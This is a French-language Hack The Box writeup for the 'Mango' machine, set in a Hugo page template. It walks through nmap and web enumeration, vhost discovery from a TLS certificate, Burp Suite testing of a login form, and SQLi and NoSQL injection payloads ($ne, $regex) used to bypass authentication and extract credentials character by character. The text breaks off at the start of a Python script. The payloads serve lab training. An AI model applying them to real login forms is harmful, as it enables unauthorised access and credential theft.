---

# === Archetype writeups – v1 (stable) ===
# === Archetype: writeups (Page Bundle) ===
# Copié vers content/writeups/<nom_ctf>/index.md

# H1 SEO (via title, pas dans le markdown)
title: "Mango — HTB Medium Writeup & Walkthrough"
linkTitle: "Mango"
slug: "mango"
date: 2026-08-11T16:19:44+02:00
#lastmod: 2026-08-11T16:19:44+02:00
draft: true

# --- PaperMod / navigation ---
type: "writeups"
summary: "Mango (HTB Medium): VirtualHost, injection NoSQL, extraction d’identifiants et escalade de privilèges via le binaire SUID jjs."
description: "Writeup de Mango (HTB Medium) : VirtualHost, injection NoSQL, extraction d’identifiants et escalade de privilèges via le SUID jjs."
tags: ["Hack The Box","HTB Medium","Web","VirtualHost","Burp Suite","NoSQLi","SSH","Credential Reuse","SUID","jjs","linux-privesc"]
categories: ["Mes writeups"]

# Ajouter ensuite uniquement des tags techniques réellement utilisés dans le writeup,
# par exemple :
# - prise de pied : "Web", "SSH", "FTP"
# - faille : "XSS", "LFI", "RCE", "Path Traversal", "Shellshock"
# - techno / produit : "Grafana", "Chamilo", "CMS Made Simple", "js2py"
# - CVE : "CVE-2021-43798"
# - pivot : "Credential Reuse"
# - privesc spécifique : "sudo", "Docker", "Cron", "ACL", "PATH Hijacking", "tmux", "npbackup", "pspy64"

# --- TOC & mise en page ---
ShowToc: true
TocOpen: true
# toc_droite: 1

# --- Cover / images (Page Bundle) ---
cover:
  image: "image.png"
  alt: "Machine Mango HTB Medium exploitée via une injection NoSQL puis une escalade de privilèges avec le binaire SUID jjs"
  caption: ""
  relative: true
  hidden: false
  hiddenInList: false
  hiddenInSingle: false

# --- Paramètres CTF (placeholders à éditer après création) ---
ctf:
  platform: "Hack The Box"
  machine: "Mango"
  difficulty: "Medium"
  target_ip: "10.129.x.x"
  skills: ["Enumeration","VirtualHost","NoSQL Injection","Credential Extraction","SSH","SUID","Privilege Escalation"]
  time_spent: "Plusieurs sessions"
  # vpn_ip: "14.10.10.xx"
  # notes: "Points d'attention…"

# --- Options diverses ---
# weight: 10
# ShowBreadCrumbs: true
# ShowPostNavLinks: true

# --- SEO Reminders (à compléter après création) ---
# 1) Titre :
#    - Doit contenir : Nom Machine + HTB Easy ou Medium + Writeup
# 2) Description :
#    - Résumé 130–160 caractères
#    - Style “Mix Parfait” : pédagogique + technique
#    - Exemple : "Writeup de <machine> (HTB Easy ou Medium) : énumération claire, analyse de la vulnérabilité et escalade structurée."
# 3) ALT (image de couverture) :
#    - Mixer vulnérabilité + pédagogie + progression
#    - Exemple : "Machine <machine> HTB Easy ou Medium vulnérable à <faille>, expliquée étape par étape jusqu'à l'escalade."
# 4) Tags :
#    - Toujours ["Easy ou Medium"]
#    - Ajouter d'autres selon le thème : ["web","shellshock","heartbleed","enum"]
# 5) Structure :
#    - H1 = titre
#    - Description = meta description + preview social
#    - ALT = SEO image + accessibilité

# --- SEO CHECKLIST (à valider avant publication) ---

# [ ] 1) Titre (title + H1)
#     - Contient : Nom Machine + HTB Easy ou Medium + Writeup
#     - Unique sur le site
#     - Lisible hors contexte HTB

# [ ] 2) Description (meta)
#     - 130–160 caractères
#     - Pas générique
#     - Ton pédagogique + technique
#     - Exemple :
#       "Writeup de <machine> (HTB Easy ou Medium) : énumération claire,
#        compréhension de la vulnérabilité et escalade structurée."

# [ ] 3) Image de couverture
#     - Présente (ou fallback)
#     - Nom explicite
#     - Dimensions cohérentes

# [ ] 4) ALT de l’image
#     - Décrit la machine + l’approche
#     - Pédagogique (pas juste technique)
#     - Exemple :
#       "Machine <machine> HTB Easy ou Medium exploitée étape par étape,
#        de l’énumération à l’escalade de privilèges."

# [ ] 5) Tags
#     - Toujours inclure la difficulté (ex: "Easy ou Medium")
#     - Ajouter uniquement des tags techniques réels

# [ ] 6) Structure du contenu
#     - Un seul H1
#     - Sections claires et hiérarchisées
#     - Pas de sections SEO artificielles

---

<!-- ====================================================================
Tableau d'infos (modèle) — Remplacer les valeurs entre <...> après création.
Aucun templating Hugo dans le corps, pour éviter les erreurs d'archetype.
====================================================================
| Champ          | Valeur |
|----------------|--------|
| **Plateforme** | <Hack The Box> |
| **Machine**    | <Mango> |
| **Difficulté** | <Easy / Medium / Hard> |
| **Cible**      | <10.129.x.x> |
| **Durée**      | <2h> |
| **Compétences**| <Enumeration, Web, Privilege Escalation> |

---
-->

## Introduction

Mango est une machine **Medium** de Hack The Box qui propose une progression intéressante entre exploitation web et escalade de privilèges sous Linux.

L’énumération met rapidement en évidence une surface d’attaque assez réduite, avec principalement SSH et des services web accessibles sur les ports `80` et `443`. 

L’analyse du certificat TLS permet toutefois de découvrir un autre nom d’hôte, `staging-order.mango.htb`, qui expose une application d’authentification différente de celle accessible directement avec `mango.htb`.

L’étude de ce formulaire conduit à identifier une vulnérabilité **NoSQLi**, puis à exploiter les différences de réponse HTTP de l’application pour extraire progressivement des noms d’utilisateur et leurs mots de passe.

Ces identifiants permettent ensuite d’obtenir un premier accès SSH et de passer du compte `mango` au compte `admin`.

La dernière partie de la machine consiste à examiner les possibilités d’escalade de privilèges depuis ce compte. Un binaire `jjs` possédant le bit SUID permet d’exécuter des commandes avec les privilèges effectifs de `root`. L’exploitation met également en évidence l’importance des options de montage Linux, notamment `nosuid`, avant d’aboutir à un shell privilégié et à la lecture de `root.txt`.

L’objectif de ce writeup est de détailler le raisonnement qui permet de passer d’une piste à la suivante, plutôt que de simplement enchaîner les commandes jusqu’aux flags.

---

## Énumération

{{< enum-intro >}}

### Scan initial

Le scan TCP complet (`scans_nmap/mango/full_tcp_scan.txt`) montre les ports ouverts suivants :

```bash
# Nmap 7.99 scan initiated [date] as: /usr/lib/nmap/nmap --privileged -Pn -p- --min-rate 5000 -T4 -oN scans_nmap/mango/full_tcp_scan.txt mango.htb
Nmap scan report for mango.htb (10.129.x.x)
Host is up (0.0076s latency).
Not shown: 65532 closed tcp ports (reset)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https

# Nmap done at [date] -- 1 IP address (1 host up) scanned in 6.66 seconds
```

### Scan FTP/SMB

Après le scan initial, le script vérifie la présence éventuelle de services **FTP** ou **SMB** afin de lancer une énumération ciblée si nécessaire :

- **FTP** sur le port **21**
- **SMB** sur le port **139** et/ou **445**

Les résultats sont enregistrés dans (`scans_nmap/mango/enum_ftp_smb_scan.txt`) :

```bash
# mon-nmap — ENUM FTP / SMB
# Target : mango.htb
# Date   : [date]

Aucun service FTP (21) ni SMB (139/445) détecté.
Ports ouverts détectés : 22,80,443
```



### Scan agressif

Le script enchaîne ensuite automatiquement sur un scan agressif orienté vulnérabilités.

Ce scan fournit des informations détaillées sur les services et versions détectés.

Les résultats sont enregistrés dans (`scans_nmap/mango/aggressive_vuln_scan.txt`) :

```bash
[+] Scan agressif orienté vulnérabilités (CTF-perfect LEGACY) pour mango.htb
[+] Commande utilisée :
    nmap -Pn -A -sV -p"22,80,443" --script="(http-vuln-* or http-shellshock or ssl-heartbleed or ssl-cert) and not (http-vuln-cve2017-1001000 or http-sql-injection or sslv2 or ssl-dh-params)" --script-timeout=30s -T4 "mango.htb"

# Nmap 7.99 scan initiated [date] as: /usr/lib/nmap/nmap --privileged -Pn -A -sV -p22,80,443 "--script=(http-vuln-* or http-shellshock or ssl-heartbleed or ssl-cert) and not (http-vuln-cve2017-1001000 or http-sql-injection or sslv2 or ssl-dh-params)" --script-timeout=30s -T4 -oN scans_nmap/mango/aggressive_vuln_scan_raw.txt mango.htb
Nmap scan report for mango.htb (10.129.x.x)
Host is up (0.0078s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http     Apache httpd 2.4.29
|_http-server-header: Apache/2.4.29 (Ubuntu)
443/tcp open  ssl/http Apache httpd 2.4.29
|_http-server-header: Apache/2.4.29 (Ubuntu)
| ssl-cert: Subject: commonName=staging-order.mango.htb/organizationName=Mango Prv Ltd./stateOrProvinceName=None/countryName=IN
| Issuer: commonName=staging-order.mango.htb/organizationName=Mango Prv Ltd./stateOrProvinceName=None/countryName=IN
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2019-09-27T14:21:19
| Not valid after:  2020-09-26T14:21:19
| MD5:     b797 d14d 485f eac3 5cc6 2fed bb7a 2ce6
| SHA-1:   b329 9eca 2892 af1b 5895 053b f30e 861f 1c03 db95
|_SHA-256: 6500 52b6 7923 042d c2c9 fca7 1d44 3087 3615 850c e4d4 1e15 a4bd 7f5c fb57 aa58
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.14
Network Distance: 2 hops
Service Info: Host: 10.129.x.x; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT     ADDRESS
1   7.15 ms 10.10.x.1
2   7.90 ms mango.htb (10.129.x.x)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at [date] -- 1 IP address (1 host up) scanned in 20.29 seconds

```



### Scan ciblé CMS

Le script exécute ensuite un scan ciblé CMS (`scans_nmap/mango/cms_vuln_scan.txt`).

```bash
# Nmap 7.99 scan initiated [date] as: /usr/lib/nmap/nmap --privileged -Pn -sV -p22,80,443 --script=http-wordpress-enum,http-wordpress-brute,http-wordpress-users,http-drupal-enum,http-drupal-enum-users,http-joomla-brute,http-generator,http-robots.txt,http-title,http-headers,http-methods,http-enum,http-devframework,http-cakephp-version,http-php-version,http-config-backup,http-backup-finder,http-sitemap-generator --script-timeout=30s -T4 -oN scans_nmap/mango/cms_vuln_scan.txt mango.htb
Nmap scan report for mango.htb (10.129.x.x)
Host is up (0.0069s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http     Apache httpd 2.4.29
| http-headers: 
|   Date: [date]
|   Server: Apache/2.4.29 (Ubuntu)
|   Content-Length: 274
|   Connection: close
|   Content-Type: text/html; charset=iso-8859-1
|   
|_  (Request type: GET)
| http-sitemap-generator: 
|   Directory structure:
|   Longest directory structure:
|     Depth: 0
|     Dir: /
|   Total files found (by extension):
|_    
|_http-devframework: Couldn't determine the underlying framework or CMS. Try increasing 'httpspider.maxpagecount' value to spider more pages.
|_http-title: 403 Forbidden
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.29 (Ubuntu)
443/tcp open  ssl/http Apache httpd 2.4.29
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Mango | Search Base
|_http-devframework: Couldn't determine the underlying framework or CMS. Try increasing 'httpspider.maxpagecount' value to spider more pages.
| http-headers: 
|   Date: [date]
|   Server: Apache/2.4.29 (Ubuntu)
|   Connection: close
|   Content-Type: text/html; charset=UTF-8
|   
|_  (Request type: HEAD)
| http-sitemap-generator: 
|   Directory structure:
|     /
|       Other: 1; php: 1
|   Longest directory structure:
|     Depth: 0
|     Dir: /
|   Total files found (by extension):
|_    Other: 1; php: 1
Service Info: Host: 10.129.x.x; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at [date] -- 1 IP address (1 host up) scanned in 18.09 seconds

```



### Scan UDP rapide

Le script lance également un scan UDP rapide afin de détecter d’éventuels services supplémentaires (`scans_nmap/mango/udp_vuln_scan.txt`).

```bash
# Nmap 7.99 scan initiated [date] as: /usr/lib/nmap/nmap --privileged -n -Pn -sU --top-ports 20 -T4 -oN scans_nmap/mango/udp_vuln_scan.txt mango.htb
Warning: 10.129.x.x giving up on port because retransmission cap hit (6).
Nmap scan report for mango.htb (10.129.x.x)
Host is up (0.0073s latency).

PORT      STATE         SERVICE
53/udp    closed        domain
67/udp    closed        dhcps
68/udp    open|filtered dhcpc
69/udp    open|filtered tftp
123/udp   closed        ntp
135/udp   open|filtered msrpc
137/udp   closed        netbios-ns
138/udp   closed        netbios-dgm
139/udp   closed        netbios-ssn
161/udp   closed        snmp
162/udp   open|filtered snmptrap
445/udp   open|filtered microsoft-ds
500/udp   closed        isakmp
514/udp   closed        syslog
520/udp   open|filtered route
631/udp   closed        ipp
1434/udp  closed        ms-sql-m
1900/udp  closed        upnp
4500/udp  closed        nat-t-ike
49152/udp closed        unknown

# Nmap done at [date] -- 1 IP address (1 host up) scanned in 10.18 seconds

```



### Énumération des chemins web

La découverte des chemins web est réalisée avec le script dédié {{< script "mon-recoweb" >}}.

```bash
mon-recoweb mango.htb

# Résultats dans le répertoire scans_recoweb/
#  - scans_recoweb/mango/RESULTS_SUMMARY.txt     ← vue d’ensemble des découvertes
#  - scans_recoweb/mango/dirb.log
#  - scans_recoweb/mango/dirb_hits.txt
#  - scans_recoweb/mango/ffuf_dirs.txt
#  - scans_recoweb/mango/ffuf_dirs_hits.txt
#  - scans_recoweb/mango/ffuf_files.txt
#  - scans_recoweb/mango/ffuf_files_hits.txt
#  - scans_recoweb/mango/ffuf_dirs.json
#  - scans_recoweb/mango/ffuf_files.json

```

Le fichier `RESULTS_SUMMARY.txt` regroupe les chemins découverts, ce qui évite de devoir parcourir l’ensemble des logs générés.

```bash
===== mon-recoweb — RÉSUMÉ DES RÉSULTATS =====
Commande principale : /home/kali/.local/bin/mes-scripts/mon-recoweb
Script              : mon-recoweb v2.2.3

Cible        : mango.htb
Périmètre    : /
Date début   : [date]

Commandes exécutées (exactes) :

[dirb — découverte initiale]
dirb http://mango.htb/ /usr/share/wordlists/dirb/common.txt -r | tee scans_recoweb/mango.htb/dirb.log

[ffuf — énumération des répertoires]
ffuf -u http://mango.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 30 -timeout 10 -fc 404 -of json -o scans_recoweb/mango.htb/ffuf_dirs.json 2>&1 | tee scans_recoweb/mango.htb/ffuf_dirs.log

[ffuf — énumération des fichiers]
ffuf -u http://mango.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -t 30 -timeout 10 -fc 404 -of json -o scans_recoweb/mango.htb/ffuf_files.json 2>&1 | tee scans_recoweb/mango.htb/ffuf_files.log

Processus de génération des résultats :
- Les sorties JSON produites par ffuf constituent la source de vérité.
- Les entrées pertinentes sont extraites via jq (URL, code HTTP, taille de réponse).
- Les réponses assimilables à des soft-404 sont filtrées par comparaison des tailles et des codes HTTP.
- Les URLs finales sont reconstruites à partir du périmètre scanné (racine du site ou sous-répertoire ciblé).
- Les résultats sont normalisés sous la forme :
    http://cible/chemin (CODE:xxx|SIZE:yyy)
- Les chemins sont ensuite classés par type :
    • répertoires (/chemin/)
    • fichiers (/chemin.ext)
- Le fichier RESULTS_SUMMARY.txt est généré par agrégation finale, sans retraitement manuel,
  garantissant la reproductibilité complète du scan.

----------------------------------------------------

=== Résultat global (agrégé) ===

http://mango.htb/. (CODE:403|SIZE:274)
http://mango.htb/.htaccess.bak (CODE:403|SIZE:274)
http://mango.htb/.htaccess (CODE:403|SIZE:274)
http://mango.htb/.htc (CODE:403|SIZE:274)
http://mango.htb/.ht (CODE:403|SIZE:274)
http://mango.htb/.htgroup (CODE:403|SIZE:274)
http://mango.htb/.htm (CODE:403|SIZE:274)
http://mango.htb/.html (CODE:403|SIZE:274)
http://mango.htb/.htpasswd (CODE:403|SIZE:274)
http://mango.htb/.htpasswds (CODE:403|SIZE:274)
http://mango.htb/.htuser (CODE:403|SIZE:274)
http://mango.htb/.php (CODE:403|SIZE:274)
http://mango.htb/server-status (CODE:403|SIZE:274)
http://mango.htb/server-status/ (CODE:403|SIZE:274)
http://mango.htb/wp-forum.phps (CODE:403|SIZE:274)

=== Détails par outil ===

[DIRB]
http://mango.htb/server-status (CODE:403|SIZE:274)

[FFUF — DIRECTORIES]
http://mango.htb/server-status/ (CODE:403|SIZE:274)

[FFUF — FILES]
http://mango.htb/. (CODE:403|SIZE:274)
http://mango.htb/.htaccess.bak (CODE:403|SIZE:274)
http://mango.htb/.htaccess (CODE:403|SIZE:274)
http://mango.htb/.htc (CODE:403|SIZE:274)
http://mango.htb/.ht (CODE:403|SIZE:274)
http://mango.htb/.htgroup (CODE:403|SIZE:274)
http://mango.htb/.htm (CODE:403|SIZE:274)
http://mango.htb/.html (CODE:403|SIZE:274)
http://mango.htb/.htpasswd (CODE:403|SIZE:274)
http://mango.htb/.htpasswds (CODE:403|SIZE:274)
http://mango.htb/.htuser (CODE:403|SIZE:274)
http://mango.htb/.php (CODE:403|SIZE:274)
http://mango.htb/wp-forum.phps (CODE:403|SIZE:274)
```



### Recherche de vhosts

Enfin, la présence éventuelle de vhosts est vérifiée à l’aide du script {{< script "mon-subdomains" >}}.

```bash
=== mon-subdomains mango.htb START ===
Script       : mon-subdomains
Version      : mon-subdomains 2.0.1
Date         : [date]
Domaine      : mango.htb
IP           : 10.129.x.x
Mode         : large
Master       : /usr/share/wordlists/htb-dns-vh-5000.txt
Codes        : 200,301,302,401,403  (strict=1)

VHOST totaux : 0
  - (aucun)

--- Détails par port ---
Port 80 (http)
  Baseline#1: code=403 size=285 words=28 (Host=xhd6cuu5su.mango.htb)
  Baseline#2: code=403 size=285 words=28 (Host=ey54p6ea13.mango.htb)
  Baseline#3: code=403 size=285 words=28 (Host=axp9ov4x8a.mango.htb)
  VHOST (0)
    - (fuzzing sauté : wildcard probable)
    - (explication : réponse identique quel que soit Host → vhost-fuzzing non discriminant)

Port 443 (https)
  Baseline#1: code=200 size=5152 words=514 (Host=fil38p7c7r.mango.htb)
  Baseline#2: code=200 size=5152 words=514 (Host=hr6xat8fzp.mango.htb)
  Baseline#3: code=200 size=5152 words=514 (Host=lgaqrdxz03.mango.htb)
  VHOST (0)
    - (fuzzing sauté : wildcard probable)
    - (explication : réponse identique quel que soit Host → vhost-fuzzing non discriminant)



=== mon-subdomains mango.htb END ===
```

Si aucun vhost distinct n’est identifié, ce fichier confirme l’absence de résultats supplémentaires.

## Prise pied

L’énumération a révélé peu de services accessibles : SSH sur le port `22` et deux services web sur les ports `80` et `443`. Avec peu d’autres pistes immédiates à explorer, tu peux commencer par examiner le comportement de ces services web dans le navigateur.

### Analyse des services web

#### Navigation en HTTP sur le port 80

En ouvrant `http://mango.htb` dans le navigateur, le serveur Apache répond avec une page `403 Forbidden`.

![Réponse 403 Forbidden sur http://mango.htb](http-mango-htb-forbidden.png)

Le service web est donc bien accessible sur le port `80`, mais le contenu demandé n’est pas disponible avec cette URL. Cette réponse indique qu’Apache traite bien la requête, même si l’accès au contenu est refusé.

#### Navigation en HTTPS sur le port 443

Tu examines ensuite le service HTTPS en ouvrant `https://mango.htb`.

Cette fois, Firefox interrompt la navigation et affiche un avertissement de sécurité indiquant que le certificat présenté par le serveur n’est pas considéré comme fiable.

![Avertissement de certificat lors de l’accès à https://mango.htb](https-mango-htb-warning.png)

#### Analyse de l’avertissement du certificat TLS

En cliquant sur `Advanced...`, Firefox affiche davantage d’informations sur l’erreur et précise que le certificat utilisé par `mango.htb` est auto-signé.

La page propose alors notamment l’option `View Certificate`.

Plutôt que de poursuivre immédiatement vers le site avec `Accept the Risk and Continue`, tu peux cliquer sur `View Certificate` afin d’examiner les informations contenues dans le certificat TLS.

#### Inspection du certificat dans le navigateur

Firefox ouvre alors le certificat dans un nouvel onglet.

![Certificat TLS de mango.htb révélant le nom d’hôte staging-order.mango.htb](https-mango-htb-certificate.png)

Dans la section `Subject Name`, le champ `Common Name` contient :

```
staging-order.mango.htb
```

Une adresse e-mail apparaît également :

```
admin@mango.htb
```

#### Identification d’un autre nom d’hôte

Le certificat révèle donc le nom d’hôte suivant :

```text
staging-order.mango.htb
```

Cette information n’est pas totalement nouvelle : elle avait déjà été relevée lors du scan Nmap agressif effectué pendant l’énumération.

Le certificat permet toutefois de confirmer visuellement que ce nom d’hôte est bien associé au serveur web de la cible.

La présence de `staging-order.mango.htb` constitue alors une nouvelle piste à tester.

#### Ajout du nouvel hôte dans `/etc/hosts`

Pour pouvoir résoudre ce nouveau nom d’hôte vers l’adresse IP de la machine cible, tu l’ajoutes dans `/etc/hosts` :

```bash
sudo nano /etc/hosts
```

et complète la ligne associée à la cible avec :

```text
10.129.x.x mango.htb staging-order.mango.htb
```

Tu peux ensuite tester directement l’accès à ce nouvel hôte dans le navigateur.

### Analyse de l’application web découverte

Une fois `staging-order.mango.htb` ajouté dans `/etc/hosts`, tu peux ouvrir directement l’adresse suivante dans le navigateur :

```text
http://staging-order.mango.htb/
```

Le serveur présente cette fois une véritable application web, avec une page d’authentification demandant un nom d’utilisateur et un mot de passe.

![Page de connexion de staging-order.mango.htb](staging-order-mango-htb-login.png)

#### Observation de la page de connexion

Tu peux commencer par effectuer quelques tentatives de connexion directement depuis le navigateur avec des identifiants quelconques, par exemple :

```text
test:test
```

puis :

```text
admin:test
```

Dans les deux cas, aucun message d’erreur particulier n’est affiché et tu es simplement renvoyé vers la page de connexion.

Le comportement de l’application ne permet donc pas de distinguer, à ce stade, un nom d’utilisateur valide d’un nom d’utilisateur inexistant.

Pour comprendre plus précisément la manière dont le formulaire communique avec le serveur, tu peux maintenant examiner la requête d’authentification avec Burp Suite.

#### Analyse de la requête d’authentification avec Burp Suite

Pour examiner précisément les données envoyées par le formulaire de connexion, tu peux intercepter une tentative d’authentification avec Burp Suite.

La configuration de Burp Suite Community Edition avec FoxyProxy est décrite dans la recette suivante :

{{< recette "burp-suite-community-edition-avec-foxyproxy" >}}

Une fois Burp Suite lancé et FoxyProxy activé dans Firefox, vérifie que l’interception est active dans `Proxy > Intercept`, puis retourne sur :

```url
http://staging-order.mango.htb/
```

et effectue une nouvelle tentative de connexion avec les identifiants :

```
test:test
```

La requête peut ensuite être envoyée dans **Repeater** afin de l’examiner et de la rejouer facilement.

Burp montre que le formulaire envoie une requête `POST` vers `/` :

```
POST / HTTP/1.1
Host: staging-order.mango.htb
Content-Type: application/x-www-form-urlencoded
```

Les valeurs saisies dans le formulaire sont transmises dans le corps de la requête :

```
username=test&password=test&login=login
```



![Requête POST d’authentification test:test dans Burp Suite Repeater](burp-suite-test-test-login.png)

La réponse `200 OK` confirme le comportement déjà observé directement dans le navigateur : après une tentative d’authentification invalide, l’application renvoie simplement la page de connexion, sans fournir de message d’erreur particulier.

La requête étant maintenant reproductible dans Repeater, tu peux commencer à modifier les valeurs de `username` et `password` afin d’observer le comportement de l’application.

Face à un formulaire d’authentification, une démarche classique consiste à tester si les paramètres transmis au serveur sont vulnérables à une injection. C’est donc la première piste que tu peux explorer ici.

### Recherche de vulnérabilités dans le formulaire d’authentification

#### Tests SQLi

L’objectif est de comparer les réponses obtenues avec une condition vraie et une condition fausse afin de repérer une éventuelle différence de comportement.

Commence par une condition vraie :

```text
username=' OR '1'='1' -- -&password=test&login=login
```

puis par une condition volontairement fausse :

```text
username=' OR '1'='2' -- -&password=test&login=login
```

La séquence :

```
-- -
```

permet de transformer la suite de la requête en commentaire SQL. La vérification du mot de passe peut ainsi ne plus être prise en compte.

Avec la tentative initiale `test:test`, la réponse était un `200 OK` et **Render** affiche simplement de nouveau la page de connexion.

En envoyant successivement les deux injections SQL précédentes, le résultat reste identique : le serveur répond toujours avec un `200 OK` et la page de connexion est à nouveau affichée.

Les conditions vraie et fausse ne produisent donc aucune différence observable.

Cela ne prouve pas l’absence de toute injection, mais rend la piste d’une SQLi classique moins probable.

Lorsque les tests SQL classiques ne donnent aucun résultat, une démarche logique consiste à poursuivre l’analyse en envisageant d’autres types de bases de données et d’autres mécanismes de traitement des paramètres.

Les bases NoSQL, notamment MongoDB, utilisent des opérateurs et une syntaxe différents de ceux des bases relationnelles. Un formulaire d’authentification qui ne réagit pas à une SQLi classique peut donc se comporter différemment lorsqu’il reçoit des opérateurs NoSQL.

Tu peux alors tester si les paramètres `username` et `password` acceptent ce type de syntaxe.

#### Tests NoSQLi

Une injection NoSQL consiste à modifier les paramètres envoyés à l’application afin qu’ils soient interprétés non comme de simples valeurs, mais comme des opérateurs ou des conditions exploitées par la base de données.

Contrairement à une injection SQL classique, on ne cherche donc pas forcément à insérer une portion de requête complète. 

On peut essayer d’utiliser des **opérateurs** qui modifient la condition de recherche. 

Parmi eux, `$ne` signifie « not equal », c’est-à-dire « différent de ».

#### Test de l’opérateur `$ne`

L’idée est de remplacer une valeur simple par une condition. Par exemple, au lieu d’envoyer :

```text
username=test&password=test&login=login
```

tu peux essayer :

```
username[$ne]=test&password[$ne]=test&login=login
```

Cette syntaxe demande en substance à l’application de rechercher une entrée dont le nom d’utilisateur n’est pas `test` et dont le mot de passe n’est pas `test`.

Si l’application interprète directement ces paramètres comme des opérateurs NoSQL, la condition devrait correspondre à un compte existant.

Il faut alors observer si la réponse du serveur diffère de celles obtenues avec les tentatives précédentes.

![Réponse 302 obtenue avec l’opérateur NoSQL $ne dans Burp Suite](burp-suite-$ne.png)

Le comportement change cette fois nettement : la réponse du serveur n’est plus un `200 OK`, mais un :

```http
HTTP/1.1 302 Found
Location: home.php
```

Cette redirection vers `home.php` indique que l’application considère la condition injectée comme valide et accorde l’accès attendu après authentification.

Le contraste avec les tentatives précédentes est important : les identifiants incorrects et les tests d’injection SQL renvoyaient systématiquement la page de connexion avec un `200 OK`, alors que l’utilisation de `$ne` provoque ici une redirection `302`.

Ce changement de comportement constitue un indice fort que les paramètres du formulaire sont interprétés comme des opérateurs NoSQL.

#### Confirmation avec l’opérateur `$regex`

Pour confirmer que l’application interprète bien les paramètres comme des opérateurs NoSQL, tu peux effectuer un second test avec `$regex`.

L’opérateur `$regex` permet de vérifier si une valeur correspond à une expression régulière.

Par exemple :

```text
username[$regex]=.*&password[$regex]=.*&login=login
```

L’expression :

```
.*
```

signifie « zéro ou plusieurs caractères quelconques ».

Si l’application interprète ces paramètres comme des opérateurs NoSQL, cette condition devrait correspondre à un nom d’utilisateur et à un mot de passe existants.

![Réponse 302 confirmant l’injection NoSQL avec l’opérateur $regex dans Burp Suite](burp-suite-confirmation-$regex.png)

Le serveur répond à nouveau avec :

```
HTTP/1.1 302 Found
Location: home.php
```

On retrouve donc exactement le même changement de comportement qu’avec `$ne`.

L’obtention d’une redirection `302` avec deux opérateurs différents confirme que le formulaire d’authentification est vulnérable à une injection NoSQL.

Dans le cadre de ces tests, une réponse `200 OK` peut désormais être considérée comme un échec de la condition injectée, tandis qu’une réponse `302 Found` avec une redirection vers `home.php` indique que cette condition a été acceptée par l’application.

### Extraction des identifiants par injection NoSQL

La vulnérabilité étant confirmée, l’objectif n’est plus seulement de contourner l’authentification, mais d’exploiter les différences de réponse pour retrouver progressivement des informations valides.

L’opérateur `$regex` est particulièrement intéressant pour cela, car il permet de tester si une valeur commence par un caractère donné, puis d’affiner progressivement la recherche.

La réponse du serveur servira alors d’indicateur :

- `200 OK` : la condition testée ne correspond pas ;
- `302 Found` : la condition correspond à une valeur valide.

#### Stratégie

L’opérateur `$regex` peut maintenant être utilisé pour tester progressivement le contenu du paramètre `username`.

Commence par vérifier si un nom d’utilisateur commence par la lettre `a` :

```text
username[$regex]=^a&password[$regex]=.*&login=login
```

Le caractère `^` indique le début de la chaîne. L’expression `^a` signifie donc « commence par `a` ».

Avec ce test, le serveur répond par une redirection :

```
HTTP/1.1 302 Found
Location: home.php
```

Cela indique qu’au moins un nom d’utilisateur commence par la lettre `a`.

Tu peux maintenant effectuer exactement le même test avec la lettre `b` :

```
username[$regex]=^b&password[$regex]=.*&login=login
```

Cette fois, le serveur répond avec un `200 OK` et renvoie la page de connexion.

La différence est donc exploitable :

- `^a` → `302 Found` : au moins un utilisateur commence par `a` ;
- `^b` → `200 OK` : aucun utilisateur ne commence par `b`.

À partir de ce principe, tu peux tester successivement toutes les lettres afin d’identifier les premières lettres des différents noms d’utilisateur présents dans l’application.

Une fois une première lettre trouvée, tu peux poursuivre la recherche caractère par caractère. Par exemple, si `^a` fonctionne, tu testes ensuite `^aa`, `^ab`, `^ac`, etc., jusqu’à identifier la deuxième lettre correcte, puis tu répètes le même principe pour les caractères suivants.

Cette méthode permet ainsi de reconstituer progressivement tous les noms d’utilisateur existants.

Une fois un nom d’utilisateur complet identifié, tu peux appliquer exactement le même principe au paramètre `password`.

Par exemple, pour tester si le mot de passe de l’utilisateur `admin` commence par la lettre `a` :

```
username=admin&password[$regex]=^a&login=login
```

Si la réponse est un `302 Found`, le premier caractère du mot de passe est correct. Sinon, tu continues avec `^b`, `^c`, etc.

Dès qu’un caractère est trouvé, tu conserves le préfixe valide et tu recherches le caractère suivant. Par exemple, si `^a` fonctionne, tu peux tester :

```
username=admin&password[$regex]=^aa&login=login
```

puis :

```
username=admin&password[$regex]=^ab&login=login
```

et ainsi de suite jusqu’à reconstituer le mot de passe complet.

La stratégie est donc la même pour les deux types d’informations :

1. identifier les noms d’utilisateur ;
2. pour chaque utilisateur trouvé, extraire son mot de passe caractère par caractère ;
3. répéter l’opération jusqu’à obtenir l’ensemble des identifiants présents dans l’application.

Cette méthode fonctionne manuellement, mais devient rapidement fastidieuse. Il est donc logique de l’automatiser avec un script.

#### Script

Tu peux automatiser la recherche avec un petit script Python. Celui-ci doit reproduire exactement le principe observé précédemment :

- envoyer une requête avec un préfixe testé par `$regex` ;
- considérer une réponse `302` comme une correspondance ;
- conserver le caractère trouvé ;
- poursuivre avec le caractère suivant.

Le script commence par rechercher les noms d’utilisateur, puis utilise chaque nom découvert pour extraire son mot de passe.

```python
import re
import requests
import string

url = "http://staging-order.mango.htb/"

